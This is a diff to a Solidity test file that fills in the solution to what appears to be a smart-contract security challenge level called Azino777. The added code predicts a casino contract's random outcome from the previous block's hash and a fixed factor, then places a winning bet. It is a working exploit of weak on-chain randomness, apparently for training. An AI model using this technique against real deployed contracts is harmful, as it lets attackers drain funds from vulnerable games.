@@ -15,9 +15,17 @@ contract Azino777Test is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        uint256 bet = computeBet();
+        instance.spin{value: 0.01 ether}(bet);
         checkSuccess();
+    }
+
+    function computeBet() internal view returns (uint256) {
+        uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
+        uint256 lastBlockNumber = block.number - 1;
+        uint256 hashVal = uint256(blockhash(lastBlockNumber));
+
+        return uint256((hashVal) / FACTOR % 100);
     }
 
     function checkSuccess() internal view override {
